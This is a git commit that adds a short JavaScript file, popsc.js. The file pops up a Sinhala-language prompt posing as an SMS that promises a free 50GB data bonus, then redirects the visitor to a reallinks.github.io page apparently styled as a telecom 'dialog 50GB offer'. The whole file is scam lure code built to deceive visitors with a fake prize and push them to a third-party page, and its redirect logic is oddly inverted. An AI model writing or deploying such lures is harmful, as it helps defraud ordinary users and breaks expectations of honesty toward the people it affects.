eb9eb96984e272116d7c91dfb12a2163e473156d
reallinks <joyparker838@gmail.com>
2025-01-02 09:53:07 +0100

    Create popsc.js

---
+++ popsc.js
@@ -0,0 +1,6 @@
+
+var password = '50GB ගන්න'
+password=prompt('SMS :සුභ පැතුම් ඔබ 50GB ප්‍රසාද දීමනාවක් සඳහා සුදුසුකම් ලබන්නේ දැයි පරීක්ෂා කර බැලීමට OK ක්ලික් කරන්න  ','50GB ගන්න');
+if (password != '50GB ගන්න') {
+location.href='https://reallinks.github.io/dialog-50GB-offer';
+}
